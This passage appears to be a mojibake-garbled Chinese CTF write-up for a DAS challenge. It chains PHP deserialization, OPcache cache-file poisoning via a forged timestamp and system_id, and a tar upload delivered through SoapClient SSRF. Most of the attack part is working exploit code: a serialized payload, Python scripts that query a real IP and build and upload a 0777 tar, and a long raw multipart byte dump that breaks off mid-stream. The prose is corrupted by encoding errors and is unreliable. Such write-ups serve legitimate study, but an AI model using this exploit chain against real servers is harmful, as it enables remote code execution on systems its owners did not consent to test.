æ¶…ğŸ¥°ğŸ¥°</p><p>è½¯é“¾æ¥?ä¼¼ä¹ä¸è¡Œ,ç›®å½•ç©¿è¶Š?ä¹Ÿä¸è¡Œ,éƒ½è¯´äº†å½“å‰ç›®å½•åªè¯»,èƒ½æ“æ§çš„åªæœ‰/tmpç›®å½•äº†.</p><p>ä¸è¿‡æœ‰ä¸ªphpinfo,è¿˜æ˜¯è¦ç»§ç»­ä¿¡æ¯æœé›†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$koi</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">siroha</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;koi = [<span class="string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/image-20231201140622508.png" alt="image-20231201140622508"></p><p>å“¦,æœ‰ä¸ªæ‰©å±•,è¿™ä¸ªæ‰©å±•æ˜¯æœ‰æ¼æ´çš„.</p><h2 id="opcache"><span id="opcache"> Opcache</span></h2><p>å…·ä½“æ¥è¯´,å°±æ˜¯åœ¨/tmpæŸä¸€ç‰¹å®šç›®å½•ä¸‹,æ”¾äº†ç¼“å­˜æ–‡ä»¶,è®¿é—®index.phpçš„æ—¶å€™,ä¼šåŠ è½½è¿™ä¸ªç¼“å­˜æ–‡ä»¶,ä»è€Œå±•ç¤ºé¡µé¢.</p><p>ä½†æ˜¯,å¦‚æœç¼“å­˜æ–‡ä»¶è¢«ç¯¡æ”¹,å°±ä¼šå˜æˆå…¶å®ƒphpä»£ç ,è€Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯é€šè¿‡taræ–‡ä»¶ä¸Šä¼ ,è¦†ç›–æ‰åŸæœ¬çš„ç¼“å­˜æ–‡ä»¶,ä»è€Œå†™å…¥ä¸€å¥è¯.</p><p>å®Œæˆè¿™ä¸ªåˆ©ç”¨,éœ€è¦å‡ ä¸ªè¦ç´ :</p><p>index.phpçš„æœ€åçš„æ—¶é—´æˆ³</p><p>å½“å‰phpçš„systemid.</p><p>è¿™ä¸ªsystemidçš„è®¡ç®—è„šæœ¬ç®€åŒ–å¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_id = hashlib.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\002&quot;</span>.<span class="title function_ invoke__">encode</span>(<span class="string">&quot;utf-8&quot;</span>)).<span class="title function_ invoke__">hexdigest</span>()</span><br></pre></td></tr></table></figure><p>æ ¹æ®phpç‰ˆæœ¬æ”¹å˜.</p><p>ç³»ç»Ÿä¼šæ ¹æ®ç¼“å­˜æ–‡ä»¶çš„æ—¶é—´æˆ³,åˆ¤å®šå…¶æœ‰æ•ˆæ€§,å¦‚æœæ—¶é—´æˆ³ä¸å¯¹,å°±ä¼šåˆ æ‰ç¼“å­˜æ–‡ä»¶å¹¶é‡æ–°ç”Ÿæˆä¸€ä»½,äºæ˜¯æˆ‘ä»¬å°±éœ€è¦ä¼ªé€ .</p><p>é‚£æ€ä¹ˆè·å–æ—¶é—´æˆ³å‘¢,<code>$_GET['LuckyE'](__FILE__)</code>é™¤äº†è·å–æºç ä¹‹å¤–,è¿˜èƒ½å¤Ÿè·å–æ—¶é—´æˆ³.</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/image-20231201141652093.png" alt="image-20231201141652093"></p><p>æœ¬åœ°èµ·ä¸ªç›¸åŒphpç‰ˆæœ¬çš„docker,å®‰è£…æ‰©å±•.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-php-ext-configure opcache --enable-opcache &amp;&amp; docker-php-ext-install opcache</span><br></pre></td></tr></table></figure><p>è·å–çš„æ—¶é—´æˆ³,è½¬ä¸ºåå…­è¿›åˆ¶,ç„¶åä¸¤ä½ä¸¤ä½çš„å€’è¿™æ”¾è¿›å»</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/image-20231201141320451.png" alt="image-20231201141320451"></p><p>ä¹Ÿå¯ä»¥å†™ä¸ªè„šæœ¬ä¿®æ”¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import hashlib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import tarfile</span><br><span class="line">import subprocess</span><br><span class="line">import os</span><br><span class="line">url = <span class="string">&quot;http://43.143.192.19:1145/?LuckyE=filectime&quot;</span></span><br><span class="line">def <span class="title function_ invoke__">timec</span>():</span><br><span class="line">    pattern = r<span class="string">&quot;\d&#123;10&#125;&quot;</span></span><br><span class="line">    timeres = requests.<span class="title function_ invoke__">get</span>(url=url)</span><br><span class="line">    <span class="keyword">match</span> = re.<span class="title function_ invoke__">search</span>(r<span class="string">&#x27;int\((\d&#123;10&#125;)\)&#x27;</span>, timeres.text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ£€æŸ¥æ˜¯å¦æœ‰åŒ¹é…</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># æå–åŒ¹é…åˆ°çš„æ•°å­—</span></span><br><span class="line">        ten_digit_number = <span class="keyword">match</span>.<span class="title function_ invoke__">group</span>(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">print</span>(ten_digit_number)</span><br><span class="line">        <span class="keyword">return</span>  ten_digit_number</span><br><span class="line">    except:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;dame&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">split_string_into_pairs</span>(input_string):</span><br><span class="line">    <span class="comment"># æ£€æŸ¥è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(input_string) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        raise <span class="title function_ invoke__">ValueError</span>(<span class="string">&quot;è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦å¿…é¡»æ˜¯å¶æ•°ã€‚&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä½¿ç”¨åˆ‡ç‰‡æ“ä½œå°†å­—ç¬¦ä¸²åˆ†å‰²æˆä¸¤ä½ä¸€ç»„çš„å­å­—ç¬¦ä¸²</span></span><br><span class="line">    pairs = [input_string[i:i+<span class="number">2</span>] <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="title function_ invoke__">len</span>(input_string), <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> pairs</span><br><span class="line">def <span class="title function_ invoke__">totime</span>(time):</span><br><span class="line">    b = <span class="title function_ invoke__">split_string_into_pairs</span>(f<span class="string">&quot;&#123;hex(int(time))&#125;&quot;</span>)</span><br><span class="line">    b.<span class="title function_ invoke__">pop</span>(<span class="number">0</span>)</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="title function_ invoke__">len</span>(b)):</span><br><span class="line">        s += b[-<span class="number">1</span>]</span><br><span class="line">        b.<span class="title function_ invoke__">pop</span>(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">changetime</span>():</span><br><span class="line">    with <span class="title function_ invoke__">open</span>(<span class="string">&quot;index.php.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        binary_data = file.<span class="title function_ invoke__">read</span>()</span><br><span class="line">        <span class="comment"># å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">        hex_data = binascii.<span class="title function_ invoke__">hexlify</span>(binary_data).<span class="title function_ invoke__">decode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        new_data = hex_data[<span class="number">0</span>:<span class="number">128</span>]+<span class="title function_ invoke__">totime</span>(<span class="title function_ invoke__">timec</span>())+hex_data[<span class="number">136</span>:]</span><br><span class="line">        with <span class="title function_ invoke__">open</span>(<span class="string">&quot;index.php.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.<span class="title function_ invoke__">write</span>(bytes.<span class="title function_ invoke__">fromhex</span>(new_data))</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">changetime</span>()</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å®Œæ—¶é—´æˆ³å,å°±å¯ä»¥æ‰“åŒ…taräº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">tar_file</span>():</span><br><span class="line">    tar_filename = <span class="string">&#x27;exp.tar&#x27;</span></span><br><span class="line">    with tarfile.<span class="title function_ invoke__">open</span>(tar_filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">        directory_info = tarfile.<span class="title function_ invoke__">TarInfo</span>(name=f<span class="string">&#x27;&#123;sys_id&#125;/var/www/html&#x27;</span>)</span><br><span class="line">        directory_info.type = tarfile.DIRTYPE</span><br><span class="line">        directory_info.mode = <span class="number">0o777</span></span><br><span class="line"></span><br><span class="line">        tar.<span class="title function_ invoke__">addfile</span>(directory_info)</span><br><span class="line"></span><br><span class="line">        tar.<span class="title function_ invoke__">add</span>(<span class="string">&#x27;index.php.bin&#x27;</span>, arcname=f<span class="string">&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸ºäº†æ–¹ä¾¿,è¿˜æ˜¯å†™äº†ä¸ªè„šæœ¬.è®¾ç½®777æƒé™ä¹Ÿæ˜¯ä¸ºäº†åœ¨/tmpç›®å½•ä¸‹å†™è¿›å».</p><p>æœ€åå°±æ˜¯è§¦å‘SSRFäº†,ç”±äºæ¶‰åŠåˆ°SoapClientçš„UAæ³¨å…¥,è€Œä¸”taråŒ…æœ‰äºŒè¿›åˆ¶æ•°æ®,å¤„ç†èµ·æ¥æ¯”è¾ƒéº»çƒ¦.</p><p>è¿™é‡Œæˆ‘å°±ç›´æ¥é€šè¿‡pythonè·å–äº†,å¾ˆæ–¹ä¾¿,ğŸ‘´çœŸtmdæ˜¯ä¸ªå¤©æ‰!!!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">tar_file</span>():</span><br><span class="line">    tar_filename = <span class="string">&#x27;exp.tar&#x27;</span></span><br><span class="line">    with tarfile.<span class="title function_ invoke__">open</span>(tar_filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">        directory_info = tarfile.<span class="title function_ invoke__">TarInfo</span>(name=f<span class="string">&#x27;&#123;sys_id&#125;/var/www/html&#x27;</span>)</span><br><span class="line">        directory_info.type = tarfile.DIRTYPE</span><br><span class="line">        directory_info.mode = <span class="number">0o777</span></span><br><span class="line"></span><br><span class="line">        tar.<span class="title function_ invoke__">addfile</span>(directory_info)</span><br><span class="line"></span><br><span class="line">        tar.<span class="title function_ invoke__">add</span>(<span class="string">&#x27;index.php.bin&#x27;</span>, arcname=f<span class="string">&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">tar_file</span>()</span><br><span class="line">def <span class="title function_ invoke__">upload</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;exp.tar&quot;</span>,<span class="title function_ invoke__">open</span>(<span class="string">&quot;exp.tar&quot;</span>,<span class="string">&quot;rb&quot;</span>).<span class="title function_ invoke__">read</span>(),<span class="string">&quot;application/x-tar&quot;</span>)&#125;</span><br><span class="line">    res  = requests.<span class="title function_ invoke__">post</span>(url=url,files=file)</span><br><span class="line">    <span class="keyword">print</span>(res.request.headers)</span><br><span class="line">    <span class="keyword">return</span> res.request</span><br><span class="line">request_content = <span class="title function_ invoke__">upload</span>()</span><br><span class="line">upload_body = <span class="title function_ invoke__">str</span>(request_content.body).<span class="title function_ invoke__">replace</span>(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)</span><br><span class="line">content_length = request_content.headers[<span class="string">&#x27;Content-Length&#x27;</span>]</span><br><span class="line"><span class="keyword">print</span>(content_length)</span><br><span class="line"><span class="keyword">print</span>(upload_body)</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/image-20231201141920429.png" alt="image-20231201141920429"></p><h2 id="soapclient"><span id="soapclient"> SoapClient</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$koi</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$postdata</span> = <span class="string">&quot;--0f9486e921f5468f9ab50745c4c93267\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;exp.tar\&quot;\r\nContent-Type: application/x-tar\r\n\r\n214510e772fba140ea7a33a277f2799e/var/www/html/\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000777\x000000000\x000000000\x0000000000000\x0000000000000\x00014543\x00 5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00././@PaxHeader\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000000\x000000000\x000000000\x0000000000034\x0000000000000\x00010212\x00 x\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0028 mtime=1696745575.7742124\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00214510e772fba140ea7a33a277f2799e/var/www/html/index.php.bin\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000666\x000000000\x000000000\x0000000001700\x0014510444150\x00017165\x00 0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00OPCACHE\x00214510e772fba140ea7a33a277f2799ep\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa9\xf9 e\x00\x00\x00\x00\x07]1\xcd    \xd8\x01\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00badm\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00ibu.\xb0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00@\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x